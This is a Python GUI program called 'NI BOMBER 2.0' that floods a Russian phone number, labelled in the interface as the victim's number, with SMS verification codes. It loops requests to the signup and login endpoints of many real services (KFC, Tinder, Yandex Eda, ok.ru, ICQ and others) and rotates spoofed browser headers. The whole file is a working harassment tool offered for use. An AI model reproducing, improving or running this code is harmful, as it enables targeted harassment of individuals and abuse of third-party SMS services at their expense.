from tkinter import *
import requests
import random

heads = [{'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
           'Accept': '*/*'},
           {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
           'Accept': '*/*'},
           {"User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
           'Accept': '*/*'},
           {'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
           'Accept': '*/*'},
           {"User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
           'Accept': '*/*'},
]

class Main(Frame):
    def __init__(self, root):
        super().__init__(root)

root = Tk()
app = Main(root)
app.place()
root.title('NI BOMBER')
root.geometry("600x400")
root.configure(background = "#0C0C28")

name = Label(root, text = "NI BOMBER 2.0", bg = '#0C0C28', fg = '#14FF0A', font = 'Helvetica 18 bold')
name.place(x = 210, y = 10)



#logic
def bomber(event):
    number = int(ent.get())
    sms = int(ent2.get())

    def attack(number, sms):
        number_7 = str(7) + str(number)
        number_plus7 = str(+7) + str(number)
        number_8 = str(8) + str(number)
        sent = 0
        while sent < sms:
            HEADERS = random.choice(heads)
            try:
                wwork = requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": number_7, "type": 2})
                sent += 1
            except:
                pass

            try:
                requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7})
                sent += 1
            except:
                pass
            
            try:
                requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": number_7}, headers=HEADERS)
                sent += 1
            except:
                pass
            
            try:
                requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": number_plus7, "api": 2, "email": "email","x-email": "x-email"}, headers=HEADERS)
                sent += 1
            except:
                pass
            
            try:
                requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': number_plus7}, headers=HEADERS)
                sent += 1
            except:
                pass
            
            try:
                utair = requests.post('https://b.utair.ru/api/v1/login/', data = {'login':number_8}, headers=HEADERS)
                sent += 1
            except:
                pass
            
            try:
                tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":number_7}, headers=HEADERS)
                sent += 1
            except:
                pass
            
            try:
                citilink = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+ number_7 +'/', headers=HEADERS)
                sent += 1
            except:
                pass
            
            try:
                ok = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number_plus7}, headers=HEADERS)
                sent += 1
            except:
                pass
            
            try:
                karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":number_7}, headers=HEADERS)
                sent += 1
            except:
                pass
            
            try:
                youdrive = requests.post('https://youdrive.today/login/web/phone', data = {'phone': number, 'phone_code': '7'},headers=HEADERS)
                sent += 1
            except:
                pass
            
            try:
                mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers=HEADERS)
                sent += 1
            except:
                pass
            
            try:
                youla = requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":number_plus7}, headers=HEADERS)
                sent += 1
            except:
                pass
            
            try:
                eda = requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + number_7}, headers=HEADERS)
                sent += 1
            except:
                pass
            
            try:
                ivi = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": number_7}, headers=HEADERS)
                sent += 1
            except:
                pass
            
            try:
                delimobile = requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": number_7, "SignupForm[device_type]": 3}, headers=HEADERS)
                sent += 1
            except:
                pass
            
            try:
                icq = requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': number_7, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
                sent += 1
            except:
                pass 

    attack(number, sms)

code = Label(root, text = "номер жертвы", fg = '#00ED00', bg = '#0C0C28', font = 'Helvetica 10 bold')
ent = Entry(root)
code.place(x = 220, y = 60)
ent.place(x = 400, y = 60)


code2 = Label(root, text = "сколько sms отправить?", fg = '#00ED00', bg = '#0C0C28', font = 'Helvetica 10 bold')
ent2 = Entry(root)
code2.place(x = 220, y = 90)
ent2.place(x = 400, y = 90)


start = Button(text='BOMB!', font = 'Helvetica 15 bold', fg = '#FF0000', bg = '#0C0C28', width = 15, height = 2)
start.place(x = 210, y = 130)

start.bind("<Button-1>", bomber)
telegram = Label(root, text = "  coded by nikait\t   \ntelegram: @aaanikit", bg = '#0C0C28', fg = '#D10A62', font = 26)

telegram.place(x = 5, y = 327)
context = Label(root, text = 'ТОЛЬКО ДЛЯ РОССИИ!', bg = '#0C0C28', fg = '#FF0000', font = 'Helvetica 12 bold')

context_number = Label(root, text = '\t\t    номер вводить без префиксов\nв формате:', bg = '#0C0C28', fg = '#FF0000', font = 'Helvetica 10 bold')

number_text = Label(root, text = '9XXXXXXXXX', bg = '#0C0C28', fg = '#00ED00', font = 'Helvetica 10 bold')

context.place(x = 390, y = 300)
context_number.place(x = 250, y = 330)
number_text.place(x = 460, y = 347)

root.mainloop()
